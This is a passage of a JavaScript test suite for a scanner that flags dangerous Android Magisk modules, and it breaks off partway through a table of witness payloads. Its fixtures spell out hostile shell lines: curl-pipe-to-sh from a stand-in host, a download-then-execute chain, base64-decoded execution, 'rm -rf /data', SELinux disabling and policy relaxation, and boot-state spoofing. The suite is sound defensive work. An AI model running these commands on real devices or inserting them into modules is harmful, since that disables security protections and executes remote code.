const P7_BOOT_DECOY = 'echo "resetprop -w ro.boot.verifiedbootstate green"; resetprop -w ro.boot.verifiedbootstate green';
const P7_LIVE_DECOY = 'echo "magiskpolicy --live"; magiskpolicy --live "allow su * fs:file { execute_no_trans }"';

/** 数一行里到底有几个匹配 —— 用来证明「基数」类夹具本身不是空转。 */
function matchCount(ruleId, line) {
  const r = RULES_BY_ID[ruleId];
  assert.ok(r, `规则 ${ruleId} 不存在`);
  const flags = r.pattern.flags.includes('g') ? r.pattern.flags : r.pattern.flags + 'g';
  const re = new RegExp(r.pattern.source, flags);
  let n = 0, m;
  while ((m = re.exec(line)) !== null) {
    n++;
    if (m.index === re.lastIndex) re.lastIndex++;
  }
  return n;
}

test('fix3-P7：echo 前缀 decoy 不许让同行真命令静默（VERIFIED_BOOT_SPOOF 实测曾 0 findings → low → auto-approve）', () => {
  assert.ok(matchCount('VERIFIED_BOOT_SPOOF', P7_BOOT_DECOY) >= 1, '夹具必须真命中，否则下面的断言是空转');
  const h = hits('VERIFIED_BOOT_SPOOF', P7_BOOT_DECOY);
  assert.equal(h.length, 1, `一行只出 1 条发现，但必须有：${JSON.stringify(h)}`);
  assert.equal(h[0].severity, 'high');
  assert.equal(h[0].line, 1);
  assert.match(h[0].snippet, /resetprop -w ro\.boot\.verifiedbootstate/, 'snippet 要指名造成结论的那个匹配');
  assert.ok(!/echo/.test(h[0].snippet), `证据不许是被豁免的最左 decoy：${h[0].snippet}`);
  // 单独一行真命令的行为必须原样保留（基数与档位都没被这次改动动过）
  const alone = hits('VERIFIED_BOOT_SPOOF', 'resetprop -w ro.boot.verifiedbootstate green');
  assert.equal(alone.length, 1, 'resetprop 单独一行仍然只报 1 条');
  assert.equal(alone[0].severity, 'high');
});

test('fix3-P7：同行 decoy 的 magiskpolicy --live 照样 high，且 decoy 动词不许顶掉真动词的 snippet', () => {
  const line = 'echo "usage: supolicy --live 未使用"; magiskpolicy --live "allow su * *"';
  assert.equal(matchCount('MAGISK_POLICY_LIVE', line), 2, '夹具必须在一行里造出两个匹配');
  const h = hits('MAGISK_POLICY_LIVE', line);
  assert.equal(h.length, 1, '基数不变：一行一条');
  assert.equal(h[0].severity, 'high');
  assert.match(h[0].snippet, /magiskpolicy --live/);
  assert.ok(!/supolicy/.test(h[0].snippet), `snippet 必须是产生结论的那个匹配，不是最左的 supolicy decoy：${h[0].snippet}`);
  const h2 = hits('MAGISK_POLICY_LIVE', P7_LIVE_DECOY);
  assert.equal(h2.length, 1);
  assert.equal(h2[0].severity, 'high', P7_LIVE_DECOY);
});

test('fix3-P7：decoy rm 行的 severity 取「非豁免匹配里的最大档」（实测曾 medium，裸 rm -rf /data 是 high）', () => {
  const bare = hits('RM_RF_MUTABLE', 'rm -rf /data');
  assert.equal(bare.length, 1);
  assert.equal(bare[0].severity, 'high', '基准：裸 rm -rf /data 一直是 high');
  const decoy = hits('RM_RF_MUTABLE', 'rm -rf "$TMP_PATH"; rm -rf /data');
  assert.equal(decoy.length, 1, '基数不变：一行一条');
  assert.equal(decoy[0].severity, 'high', `写在前面那半行不许把 /data 降成 medium：${JSON.stringify(decoy)}`);
});

test('fix3-P7：豁免是逐个匹配的 —— 只有「该行全部匹配都可豁免」才跳过整行', () => {
  // 反向哨兵（不许把工厂改成「不再豁免」）：两个匹配都落在模块自有目录 → 0 条
  assert.equal(matchCount('RM_RF_MUTABLE', 'rm -rf $MODDIR/cache; rm -rf $MODPATH/tmp'), 2);
  assert.equal(hits('RM_RF_MUTABLE', 'rm -rf $MODDIR/cache; rm -rf $MODPATH/tmp').length, 0,
    '全部匹配都可豁免时必须仍然跳过整行');
  // 注释行里的两个 resetprop 都只说明不执行 → 0 条
  assert.ok(matchCount('VERIFIED_BOOT_SPOOF', '# resetprop ro.boot.verifiedbootstate green 与 resetprop ro.boot.flash.locked 0') >= 1);
  assert.equal(hits('VERIFIED_BOOT_SPOOF', '# resetprop ro.boot.verifiedbootstate green 与 resetprop ro.boot.flash.locked 0').length, 0);
  // 一个可豁免 + 一个不可豁免 → 1 条，且按不可豁免那个定档
  const mixed = hits('RM_RF_MUTABLE', 'rm -rf $MODDIR/cache; rm -rf /system');
  assert.equal(mixed.length, 1);
  assert.equal(mixed[0].severity, 'high', JSON.stringify(mixed));
});

test('fix3-P7：同一个根因的另一条通道 —— 贪心 [^\\n]* 不许把同行两条命令并成一个匹配', () => {
  // 工厂改完仍然打不中的形状：pattern 里动词与键名之间是贪心的 `[^\n]*`，一行里的两条命令被并成
  // **一个**匹配（实测 matches=1 → 0 findings），于是「可豁免的前半行」把后半行的真载荷一起吃掉。
  // 修法与 MAGISK_POLICY_LIVE 的 `[^|;\n]*` 同例：动词与键名锁在同一条命令里。
  const boot = 'echo "resetprop -w ro.boot.verifiedbootstate green"; resetprop -w ro.boot.verifiedbootstate green';
  assert.equal(matchCount('VERIFIED_BOOT_SPOOF', boot), 2, '不许并成一个匹配，否则豁免判断只能看最左那条');
  const dbg = 'echo "setprop ro.secure 0"; setprop ro.secure 0';
  assert.equal(matchCount('DEBUGGABLE_ENABLE', dbg), 2, 'DEBUGGABLE_ENABLE 是同一条 pattern 形状的第二个受害者');
  const h = hits('DEBUGGABLE_ENABLE', dbg);
  assert.equal(h.length, 1);
  assert.equal(h[0].severity, 'medium', '与脚本侧规则同档：medium（high 已判给启动状态伪造）');
  assert.equal(h[0].snippet, 'setprop ro.secure 0', `证据要指名真命令：${JSON.stringify(h)}`);
});

test('fix3-P7：基数不变 —— 同一行同一规则最多 1 条发现（朴素「每个匹配都报」在真实包上实测 +10,046 条，其中 +10,001 条是 SUSPICIOUS_DOMAIN）', () => {
  const line = 'var a="https://a.tk/1",b="https://b.xyz/2",c="https://c.top/3";'.repeat(8);
  assert.ok(matchCount('SUSPICIOUS_DOMAIN', line) > 10, `夹具必须造出 >10 个匹配，实际 ${matchCount('SUSPICIOUS_DOMAIN', line)}`);
  const h = hits('SUSPICIOUS_DOMAIN', line);
  assert.equal(h.length, 1, '压缩过的 bundle 一行命中几十次也只许报 1 条');
  assert.equal(h[0].severity, 'medium');
});

test('fix3-P7：maxPerFile 语义保留 —— 上限按行计（每行一条），不是按匹配计', () => {
  const text = Array.from({ length: 30 }, (_, i) => `rm -rf /data # 第 ${i} 行`).join('\n');
  const h = hits('RM_RF_MUTABLE', text);
  assert.equal(h.length, 20, `默认 maxPerFile=20，按行计：实际 ${h.length}`);
  assert.equal(new Set(h.map((f) => f.line)).size, 20, '20 条要来自 20 个不同行号');
  assert.deepEqual(h.map((f) => f.line), [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]);
});

test('fix3-P7：定档取最大时 snippet 跟着最重的那个匹配走（HARDCODED_IP 内外网同行）', () => {
  const h = hits('HARDCODED_IP', 'ping 10.0.0.1 && curl http://203.0.113.9/x');
  assert.equal(h.length, 1);
  assert.equal(h[0].severity, 'medium', '内网 low 在前、公网 medium 在后 —— 结论取最大档');
  assert.equal(h[0].snippet, '203.0.113.9', `snippet 必须指名公网 IP：${h[0].snippet}`);
  assert.ok(!/10\.0\.0\.1/.test(h[0].snippet), '不许把最左的低档匹配写成风险本体');
});

test('fix3-P7 端到端：两行 echo decoy 组成的 service.sh 不再被判 low、不再自动放行', async () => {
  const r = await scanToReport(makeModuleZip({ id: 'eval.f3p7', files: [
    ['module.prop', moduleProp('eval.f3p7')],
    ['service.sh', `#!/system/bin/sh\n${P7_BOOT_DECOY}\n${P7_LIVE_DECOY}\n`],
  ] }), { changeType: 'first' });
  const hi = r.findings.filter((f) => f.severity === 'high');
  assert.equal(hi.length, 2, JSON.stringify(r.findings.map((f) => `${f.ruleId}@${f.line}:${f.snippet}`)));
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block', '旧行为实测 low → auto-approve');
  for (const f of hi) assert.ok(!/^\s*echo\b/.test(f.snippet), `证据指名了 decoy 而不是真命令：${f.snippet}`);
});

// —— P8：permissive / typepermissive ——
// 简报实测：`typepermissive su;` 与 `permissive magisk;` 在 cd79136 上是 0 hits。
// 它比任何 allow 都弱（该域的所有拒绝只记日志不拦），却没有规则。
// 坑（简报已确认）：SELINUX_POLICY_RELAX 的 pattern 硬要求动词后面出现 `{`，
// 所以「把动词表从 allow 扩成 allow|permissive|typepermissive」打不中 —— 必须自成一支。

const P8_SAFE = [
  '# permissive su;',                                  // 整行注释：仍然豁免
  '   # 说明：本模块不会 typepermissive su;',
  'description=permissive license',                    // 英文说明里的形容词不是策略语句
  'ui_print "- 我们不写 permissive 规则"',
  'permissive_note=1',                                 // 属性键名里含这个词
  'enforce su;',
  'getenforce',
];

test('fix3-P8：typepermissive / permissive 必须有规则命中 high（实测曾 0 hits → low → auto-approve）', () => {
  const hit = [
    'typepermissive su;',
    'permissive magisk;',
    '  typepermissive su;',
    'permissive { su magisk };',
    'typepermissive untrusted_app;',
    'echo "本模块不 typepermissive su;"; typepermissive su;',   // P7：decoy 顶不掉真语句
    'MODDIR=${0%/*}; typepermissive su;',
  ];
  for (const line of hit) {
    const h = hits('SELINUX_TYPE_PERMISSIVE', line);
    assert.equal(h.length, 1, `应当命中且只命中 1 条：${line} —— 实际 ${JSON.stringify(h)}`);
    assert.equal(h[0].severity, 'high', `permissive 是 high：${line}`);
    assert.equal(h[0].category, 'root');
    assert.match(h[0].snippet, /(?:type)?permissive/, `证据要指名这半句：${h[0].snippet}`);
  }
  // RELAX 那条规则不许顺手把 permissive 也报一遍（两条规则各自说话，snippet 才对得上）
  assertNoHit('SELINUX_POLICY_RELAX', 'typepermissive su;', 'RELAX 硬要求 `{`，这条由新规则负责');
});

test('fix3-P8：注释行与英文说明里的 permissive 仍然豁免（假阳性烧的是人工容量）', () => {
  for (const line of P8_SAFE) {
    assertNoHit('SELINUX_TYPE_PERMISSIVE', line, line);
  }
  // 反向哨兵：豁免只认「整行注释 / 说明位」，行尾 # 关不掉策略语句（fix2-P6 同一判据）
  assert.equal(hits('SELINUX_TYPE_PERMISSIVE', 'typepermissive su; # 行尾说明').length, 1);
});

test('fix3-P8 端到端：sepolicy.rule 里一行 typepermissive su; 不再被判 low', async () => {
  const r = await scanToReport(makeModuleZip({ id: 'eval.f3p8', files: [
    ['module.prop', moduleProp('eval.f3p8')],
    ['sepolicy.rule', '# 收紧自家域的日志噪音\ndontaudit su su:file read;\ntypepermissive su;\n'],
  ] }), { changeType: 'first' });
  const f = r.findings.find((x) => x.ruleId === 'SELINUX_TYPE_PERMISSIVE');
  assert.ok(f, JSON.stringify(r.findings.map((x) => x.ruleId)));
  assert.equal(f.file, 'sepolicy.rule');
  assert.equal(f.line, 3, '注释行与 dontaudit 行都不许占用行号');
  assert.equal(f.severity, 'high');
  assert.equal(r.riskLevel, 'high');
  assert.equal(r.decision.action, 'block');
  assert.match(renderMarkdown(r), /SELINUX_TYPE_PERMISSIVE|关闭整个域/, 'Markdown 里要看得见这条结论');
});

test('fix3-P8：新规则接进规则表且分类/级别与简报一致，合法模块夹具仍然 0 命中', () => {
  assert.ok(CONTENT_RULES.some((r) => r.id === 'SELINUX_TYPE_PERMISSIVE'), '不进 CONTENT_RULES 的话 scanContent 根本不会跑它');
  const rule = RULES_BY_ID.SELINUX_TYPE_PERMISSIVE;
  assert.equal(rule.category, 'root');
  assert.equal(rule.severity, 'high');
  assert.ok(rule.title && rule.advice);
  assert.ok(CATEGORY_LABEL[rule.category], '分类必须有中文标题，否则报告分组是空的');
  for (const line of P8_SAFE) assert.equal(rule.scan('sepolicy.te', line).length, 0, line);
});

// —— P9：属性文件里直写削弱安全的键 ——
// 简报实测：`ro.debuggable=1` 写进 system.prop 是 0 hits，而同一意图走 resetprop/setprop 是
// DEBUGGABLE_ENABLE medium。同一意图、换个机制就完全免检，是一条平凡可达的绕行通道。
// 范围必须窄：只认那四个具名键的**削弱值**，不是「任何 ro. 键」。

test('fix3-P9：.prop 直写四个具名削弱键必须命中 medium（实测曾 0 hits → low → auto-approve）', () => {
  const hit = [
    'ro.debuggable=1',
    'ro.secure=0',
    'ro.adb.secure=0',
    'service.adb.root=1',
    '  ro.debuggable = 1',                 // 缩进与等号两侧空白不改属性语义
    'ro.secure=0   # 说明写在行尾',
  ];
  for (const line of hit) {
    const h = hits('PROP_SECURITY_WEAKEN', line);
    assert.equal(h.length, 1, `应当命中且只命中 1 条：${line} —— 实际 ${JSON.stringify(h)}`);
    assert.equal(h[0].severity, 'medium', `medium —— 镜像脚本侧 DEBUGGABLE_ENABLE，high 已判给启动状态伪造：${line}`);
    assert.equal(h[0].category, 'root');
  }
  // 反向哨兵：范围不许扩成「任何 ro. 键」或「任何 =0/=1」
  const safe = [
    'ro.product.model=Pixel7',             // 正经模块改机型
    'debug.sf.hw=1',                       // 图形性能开关，不是安全档位
    'ro.debuggable=0',                     // no-op：这是默认安全值
    'ro.secure=1',
    'ro.adb.secure=1',
    'service.adb.root=0',
    'ro.build.version.security_patch=2021-01-05',
    'ro.my.mod.enabled=1',
    'persist.sys.usb.config=adb',          // 仍是不覆盖的缺口（见 PROP_BOOT_SPOOF 的说明）
    'description=ro.debuggable=1 只是说明文字',
    '# ro.debuggable=1',
    'getprop ro.debuggable',
    'ro.debuggable=12',                    // 不是那个具名值
  ];
  for (const line of safe) assertNoHit('PROP_SECURITY_WEAKEN', line, line);
  // DEBUGGABLE_ENABLE 管脚本侧、本条管 .prop 侧：同一行只该由一条说话
  assertNoHit('DEBUGGABLE_ENABLE', 'ro.debuggable=1', '脚本侧规则不越界到属性文件');
});

test('fix3-P9 端到端：只在 system.prop 里写 ro.debuggable=1 的模块不再判 low', async () => {
  const r = await scanToReport(makeModuleZip({ id: 'eval.f3p9', files: [
    ['module.prop', moduleProp('eval.f3p9')],
    ['system.prop', 'ro.debuggable=1\nro.adb.secure=0\n'],
  ] }), { changeType: 'first' });
  const f = r.findings.filter((x) => x.ruleId === 'PROP_SECURITY_WEAKEN');
  assert.equal(f.length, 2, JSON.stringify(r.findings.map((x) => `${x.ruleId}@${x.file}:${x.line}`)));
  assert.deepEqual(f.map((x) => x.line), [1, 2], '行号要逐行对上，人工复核才找得到是哪两行');
  assert.ok(r.counts.medium >= 2, '两条 medium 必须参与定级：' + JSON.stringify(r.counts));
  assert.equal(r.riskLevel, 'medium', 'medium —— 与脚本侧同档');
  assert.equal(r.decision.action, 'block', '旧行为实测 low → auto-approve');
  // 反向哨兵：同一份夹具把四个键换成机型与图形开关，必须回到 low 并自动放行
  const ok = await scanToReport(makeModuleZip({ id: 'eval.f3p9ok', files: [
    ['module.prop', moduleProp('eval.f3p9ok')],
    ['system.prop', 'ro.product.model=Pixel7\ndebug.sf.hw=1\nro.debuggable=0\n'],
  ] }), { changeType: 'first' });
  assert.ok(!ok.findings.some((x) => x.ruleId === 'PROP_SECURITY_WEAKEN'), JSON.stringify(ok.findings));
  assert.equal(ok.riskLevel, 'low');
  assert.equal(ok.decision.action, 'auto-approve', 'P9 不许把正经改属性变成人工排队');
});

test('fix3-P9：新规则接进规则表，且 .prop 通道现在由两条规则分头覆盖', () => {
  assert.ok(CONTENT_RULES.some((r) => r.id === 'PROP_SECURITY_WEAKEN'));
  const rule = RULES_BY_ID.PROP_SECURITY_WEAKEN;
  assert.equal(rule.category, 'root');
  assert.equal(rule.severity, 'medium');
  assert.ok(rule.title && rule.advice);
  assert.ok(!/persist\./.test(rule.title + rule.advice), '文案不许承诺覆盖 persist.*：' + rule.title + rule.advice);
  // 简报 F4 那句实测原句：boot 键走 PROP_BOOT_SPOOF，另两行现在由本条兜住
  const fs = scanContent('system.prop', 'ro.boot.verifiedbootstate=green\nro.debuggable=1\nro.secure=0');
  assert.deepEqual(fs.map((f) => `${f.ruleId}:${f.severity}`).sort(),
    ['PROP_BOOT_SPOOF:high', 'PROP_SECURITY_WEAKEN:medium', 'PROP_SECURITY_WEAKEN:medium'].sort(),
    JSON.stringify(fs.map((f) => `${f.ruleId}@${f.line}`)));
});

// ---------------------------------------------------------------------------
// ⑪ 第四轮修复（fix4）：P12 行首锚点 / P13 属性文件的「脚本写出」一支 / P14 锚点闭包
// ---------------------------------------------------------------------------
//
// 简报实测（d235927，单行输入；`0 命中` = 载荷对扫描器隐形）：
//   0 命中  SELINUX_POLICY_RELAX   sepolicy.rule     x=1; allow su * * { execute };
//   0 命中  SELINUX_POLICY_RELAX   post-fs-data.sh   printf "allow su * * { execute }\n" >> /data/adb/magisk/policy
//   0 命中  PROP_SECURITY_WEAKEN   service.sh        printf "ro.debuggable=1\n" >> /data/adb/modules/x/system.prop
//   0 命中  PROP_BOOT_SPOOF        service.sh        echo "ro.boot.verifiedbootstate=green" >> system.prop
//   high    VERIFIED_BOOT_SPOOF    service.sh        x=1; resetprop -w ro.boot.verifiedbootstate green
// 用 `^\s*` 表达「这一行的开头就是载荷」的规则会被行前缀绕过，用左边界类的不会 ——
// 这是同一个形状第三次复发（fix1 的注释豁免、fix3-P7 的首匹配、本轮的锚点）。
// P12/P13 补这一族的两个洞，P14 把形状关掉：**沉默必须有声明，声明必须有 witness**。

// —— P12：SELINUX_POLICY_RELAX 不许要求行首 ——
const P12_HIT = [
  'x=1; allow su * * { execute };',
  'printf "allow su * * { execute }\\n" >> /data/adb/magisk/policy',
  'printf "allow su * fs:file { read write open execute };\\n" >> sepolicy.rule',
  'echo "allow su * * { execute }" > /data/adb/service.d/p',            // 带写出就不是说明位
  'MODDIR=${0%/*}; allow su * * { execute };',
  'dontaudit su su:file read; allow su * * { execute };',
  'ui_print "先看一眼"; allow su magisk su:process { execmem };',
  'allow su * * { execute } # 行尾说明关不掉这一行（fix2-P6 同判据）',
];

// 豁免侧的形状（本轮只许往这里加，不许往 P12_HIT 那边收）：
// 整行注释 / 纯打印说明位 / 变量与 key=value 的赋值位。
const P12_SAFE = [
  '# allow su * * { execute };',
  '   # 注释：allow su * * { execute } 只是说明文字',
  'echo "allow su * fs:file { execute }"',
  'SELINUX_ALLOW="allow su * fs:file { execute }"',
  'description=allow su * * { execute } 是文案',
  'auditallow magisk magisk:process *;',           // 词里含 allow，边界类不认 i
  'dontaudit su su:file read;',
  'allow su shell:process transition;',            // 没有权限块
  'allow su * fs:file { };',
  'genfscon magiskfs /data/adb/magisk u:object_r:magisk_file:s0',
];

test('fix4-P12：allow 规则出现在行中间也必须命中 high（实测曾 0 命中 → low → auto-approve）', () => {
  for (const line of P12_HIT) {
    const h = hits('SELINUX_POLICY_RELAX', line);
    assert.equal(h.length, 1, `应当命中且只命中 1 条：${line} —— 实际 ${JSON.stringify(h)}`);
    assert.equal(h[0].severity, 'high', `RELAX 是 high：${line}`);
    assert.equal(h[0].category, 'root');
  }
});

test('fix4-P12：证据要指名 allow 那一句，不许指名前缀的 printf/echo', () => {
  for (const line of [
    'x=1; allow su * * { execute };',
    'printf "allow su * * { execute }\\n" >> /data/adb/magisk/policy',
    'ui_print "先看一眼"; allow su magisk su:process { execmem };',
  ]) {
    const [f] = assertHit('SELINUX_POLICY_RELAX', line, line);
    assert.match(f.snippet, /allow\s+su/, `snippet 要指到授权那一句：${f.snippet}`);
    assert.ok(!/^(?:printf|echo|ui_print|x=1)/.test(f.snippet),
      `snippet 被前缀那半行顶掉了（fix3-P7 同判据，contract 4）：${f.snippet}`);
  }
});

test('fix4-P12：豁免侧只收窄到「整行注释 / 说明位 / 赋值位」—— 行内 # 依然不许关嘴', () => {
  for (const line of P12_SAFE) assertNoHit('SELINUX_POLICY_RELAX', line, line);
  // 反向哨兵：豁免只认整行注释；载荷之后出现的 # 是策略文本的一部分，不是注释
  assertHit('SELINUX_POLICY_RELAX', 'allow su * * { execute } # 只是说明');
  assertHit('SELINUX_POLICY_RELAX', 'x=1; allow su * * { execute }; # 只是说明');
  // fix3 报告 §8.1 披露的那三条，本轮必须一起闭掉
  assertHit('SELINUX_POLICY_RELAX', 'echo "本模块不授权执行"; allow su * fs:file { execute_no_trans };');
  assertHit('SELINUX_POLICY_RELAX', 'dontaudit su su:file read; allow su * * { execute };');
  assertHit('SELINUX_POLICY_RELAX', 'MODDIR=${0%/*}; allow su * * { execute };');
});

test('fix4-P12 端到端：post-fs-data.sh 里 printf >> policy 的模块不再判 low', async () => {
  const r = await scanToReport(makeModuleZip({ id: 'eval.f4p12', files: [
    ['module.prop', moduleProp('eval.f4p12')],
    ['post-fs-data.sh', '#!/system/bin/sh\nprintf "allow su * * { execute }\\n" >> /data/adb/magisk/policy\n'],
  ] }), { changeType: 'first' });
  const f = r.findings.find((x) => x.ruleId === 'SELINUX_POLICY_RELAX');
  assert.ok(f, JSON.stringify(r.findings.map((x) => x.ruleId)));
  assert.equal(f.severity, 'high');
  assert.equal(f.line, 2);
  assert.equal(r.riskLevel, 'high', '旧行为实测 low → auto-approve');
  assert.equal(r.decision.action, 'block');
});

// —— P13：属性文件规则需要「脚本写出」这一支 ——
const P13_BOOT_HIT = [
  'printf "ro.boot.verifiedbootstate=green\\n" >> /data/adb/modules/x/system.prop',
  'x=1; printf "ro.boot.vbmeta.device_state=unlocked\\n" >> $MODDIR/system.prop',
  'echo "ro.boot.flash.locked=0" >> system.prop',
  'echo ro.boot.veritymode=enforcing > /data/adb/modules/m/system.prop',
  'cat f > /data/adb/modules/m/system.prop && echo "ro.boot.verifiedbootstate=green" >> /data/adb/modules/m/system.prop',
];
const P13_BOOT_SAFE = [
  '# printf "ro.boot.verifiedbootstate=green\\n" >> /data/adb/modules/x/system.prop',
  'echo "ro.boot.verifiedbootstate=green"',                        // 只是打印，没有写出动作
  'getprop ro.boot.verifiedbootstate',
  'ui_print "- 本模块不会写 ro.boot.verifiedbootstate=green"',
  'printf "ro.product.model=Pixel7\\n" >> f',                      // 键不在四个里
  'printf "ro.debuggable=1\\n" >> f',                              // 那是 PROP_SECURITY_WEAKEN 的键
  'printf "ro.boot.verifiedbootstatex=green\\n" >> f',             // 不是那个键名
  'description=ro.boot.verifiedbootstate=green 这个模块不上锁',
];

const P13_WEAK_HIT = [
  'printf "ro.debuggable=1\\n" >> /data/adb/modules/x/system.prop',
  'x=1; printf "ro.secure=0\\n" >> /data/adb/service.d/x.prop',
  'echo "ro.adb.secure=0" >> custom.prop',
  'echo service.adb.root=1 >> $MODDIR/system.prop',
];
const P13_WEAK_SAFE = [
  '# printf "ro.debuggable=1\\n" >> f',
  'echo "ro.debuggable=1"',                                        // 没有写出
  'printf "ro.debuggable=12\\n" >> f',                             // 不是那个具名值
  'printf "ro.debuggable=0\\n" >> f',                              // no-op：默认安全值
  'printf "ro.product.model=Pixel7\\n" >> f',
  'printf "persist.sys.usb.config=adb\\n" >> f',                   // 仍是已披露的缺口
  'printf "ro.secure=1\\n" >> f',
  'description=ro.debuggable=1 只是说明文字',
];

test('fix4-P13：PROP_BOOT_SPOOF 必须有「脚本写进属性文件」那一支，severity 仍是 high（实测曾 0 命中）', () => {
  for (const line of P13_BOOT_HIT) {
    const h = hits('PROP_BOOT_SPOOF', line);
    assert.ok(h.length > 0, `PROP_BOOT_SPOOF 应当命中：${line} —— 实际 0 命中`);
    assert.equal(h[0].severity, 'high', `启动/完整性状态伪造是 high（简报已拍定）：${line}`);
  }
  for (const line of P13_BOOT_SAFE) assertNoHit('PROP_BOOT_SPOOF', line, line);
  // 行首那一支不许因为加了第二支而退化：真实 .prop 条目照常命中
  for (const line of ['ro.boot.verifiedbootstate=green', 'ro.boot.flash.locked=0', '  ro.boot.veritymode=enforcing']) {
    assertHit('PROP_BOOT_SPOOF', line, line);
  }
  // 键表不许扩
  assertNoHit('PROP_BOOT_SPOOF', 'printf "persist.sys.bootloader.locked=0\\n" >> f', '非 boot 家族仍是不覆盖的缺口');
});

test('fix4-P13：PROP_SECURITY_WEAKEN 同形那一支，severity 仍是 medium，四个具名键不许扩', () => {
  for (const line of P13_WEAK_HIT) {
    const h = hits('PROP_SECURITY_WEAKEN', line);
    assert.ok(h.length > 0, `PROP_SECURITY_WEAKEN 应当命中：${line} —— 实际 0 命中`);
    assert.equal(h[0].severity, 'medium', `medium —— 镜像脚本侧 DEBUGGABLE_ENABLE：${line}`);
  }
  for (const line of P13_WEAK_SAFE) assertNoHit('PROP_SECURITY_WEAKEN', line, line);
  for (const line of ['ro.debuggable=1', 'ro.secure=0', 'ro.adb.secure=0', 'service.adb.root=1']) {
    assertHit('PROP_SECURITY_WEAKEN', line, line);
  }
  // 两条规则各管各的键，同一行只该由一条说话
  assertNoHit('PROP_BOOT_SPOOF', 'printf "ro.debuggable=1\\n" >> f', '削弱键归 P9 那条');
  assertNoHit('PROP_SECURITY_WEAKEN', 'printf "ro.boot.verifiedbootstate=green\\n" >> f', 'boot 键归 F4 那条');
});

test('fix4-P13 端到端：customize.sh 里 printf >> system.prop 的模块不再判 low，且改机型仍自动放行', async () => {
  // 用**相对路径**的 system.prop —— `>> $MODDIR/system.prop` 那种形状至少还被邻居规则 MODDIR_RUNTIME_WRITE
  // 抓着（实测 eval.f4p14：high，但三条目标规则自己全是 0 命中）；而 customize.sh 刷写时工作目录就是模块目录，
  // `printf … >> system.prop` 是它最惯用的写法，P13 之前整条包里一条发现都没有（low → auto-approve）。
  const r = await scanToReport(makeModuleZip({ id: 'eval.f4p13', files: [
    ['module.prop', moduleProp('eval.f4p13')],
    ['customize.sh', '#!/system/bin/sh\nui_print "- writing props"\nprintf "ro.boot.verifiedbootstate=green\\n" >> system.prop\nprintf "ro.debuggable=1\\n" >> system.prop\n'],
  ] }), { changeType: 'first' });
  const prop = r.findings.filter((f) => f.ruleId === 'PROP_BOOT_SPOOF' || f.ruleId === 'PROP_SECURITY_WEAKEN');
  assert.deepEqual(prop.map((f) => `${f.ruleId}@${f.line}:${f.severity}`).sort(),
    ['PROP_BOOT_SPOOF@3:high', 'PROP_SECURITY_WEAKEN@4:medium'].sort(),
    JSON.stringify(r.findings.map((f) => `${f.ruleId}@${f.line}`)));
  assert.equal(r.riskLevel, 'high', '旧行为实测 low → auto-approve');
  assert.equal(r.decision.action, 'block');
  // 反向哨兵：同一形状写合法键，必须回到 low + auto-approve
  // （注意这里也写相对路径：`>> $MODDIR/…` 会被既有规则 MODDIR_RUNTIME_WRITE 判 high，与本条要证的不是同一件事）
  const ok = await scanToReport(makeModuleZip({ id: 'eval.f4p13ok', files: [
    ['module.prop', moduleProp('eval.f4p13ok')],
    ['customize.sh', '#!/system/bin/sh\nui_print "- writing props"\nprintf "ro.product.model=Pixel7\\n" >> system.prop\n'],
  ] }), { changeType: 'first' });
  assert.ok(!ok.findings.some((f) => f.ruleId === 'PROP_BOOT_SPOOF' || f.ruleId === 'PROP_SECURITY_WEAKEN'),
    JSON.stringify(ok.findings.map((f) => f.ruleId)));
  assert.equal(ok.riskLevel, 'low');
  assert.equal(ok.decision.action, 'auto-approve');
});

// —— P14：锚点闭包 ——
// 三条硬要求：
//   ① 每条 line 规则都要声明 anchor ∈ {'line-start','anywhere'}；缺声明 = 红，**不许跳过**
//      （「缺就跳过」正是装饰性守卫的形状，变异 (c) 就是冲它来的）；
//   ② 声明 anywhere 的规则必须扛住一行前缀（ANCHOR_PREFIX + 已知载荷）；声明 line-start 的规则
//      必须指名 sibling，并且同一载荷的「脚本写出」形态在 sibling 上真的命中；
//   ③ 删掉失败的那条规则不算修好：固定的必备 id 清单 + 规则数地板 + witness 表与规则表互为定义，
//      再加覆盖度地板（这张表跳过的规则数必须是 0）。
// 这里不重写任何模式匹配：断言全部走 shipped 规则的 scan()。
const ANCHOR_PREFIX = 'x=1; ';

const ANCHOR_WITNESS = {
  RM_RF_MUTABLE: { payload: 'rm -rf /data' },
  PIPE_TO_SHELL: { payload: 'curl -s https://abc.cc/x.sh | sh' },
  EXEC_BUNDLED_FILE: { payload: 'sh $MODDIR/payload.bin' },
  EXEC_INDIRECT: { payload: 'sh $PAYLOAD' },
  MODDIR_RUNTIME_WRITE: { payload: 'unzip -q -d $MODDIR /sdcard/p.zip' },
  DOWNLOAD_TO_STDOUT: { payload: 'wget -q -O- https://abc.cc/x' },
  // Task 3：跨行规则的 witness 载荷必须是**一整篇文本**（hits 把整个 payload 当一篇文本喂给 scan()），
  // 一条完整的「下载 → 落盘 → 执行」链恰好命中 1 条；前缀形态（ANCHOR_PREFIX 只落在第一行）仍 1 条 ——
  // 这两件事一起证明：这一支的锚点是「逻辑行里的命令位」，不是「物理行的第一个字符」。
  DOWNLOAD_THEN_EXEC: {
    payload: 'curl https://abc.cc/x -o /data/local/tmp/u\nchmod 700 /data/local/tmp/u\n/data/local/tmp/u\n',
  },
  // Task 3.1 §3：tree 那一格。跨行规则同上 —— witness 必须是一整篇文本，且**恰好**命中 1 条。
  DOWNLOAD_TO_MODULE_EXEC: {
    payload: 'wget -qO "$MODPATH/system/bin/bash" https://abc.cc/bash\nchmod 0755 "$MODPATH/system/bin/bash"\n',
  },
  OBFUSCATED_DECODE_EXEC: { payload: 'echo $B64 | base64 -d | sh' },
  OBFUSCATED_DECODE_ONLY: { payload: 'echo $B64 | base64 -d > /data/local/tmp/out' },
  WRITE_SYSTEM_VENDOR: { payload: 'echo x >> /system/etc/hosts' },
  SELINUX_DISABLE: { payload: 'setenforce 0' },
  HOSTS_MODIFY: { payload: 'sed -i "s/^/#/" /system/etc/hosts' },
  SELINUX_POLICY_RELAX: { payload: 'allow su * * { execute };' },
  SELINUX_TYPE_PERMISSIVE: { payload: 'typepermissive su;' },
  MAGISK_POLICY_LIVE: { payload: 'magiskpolicy --live "allow su * *"' },
  VERIFIED_BOOT_SPOOF: { payload: 'resetprop -w ro.boot.verifiedbootstate green' },
  DEBUGGABLE_ENABLE: { payload: 'setprop ro.secure 0' },
  PROP_BOOT_SPOOF: {
    payload: 'ro.boot.verifiedbootstate=green',
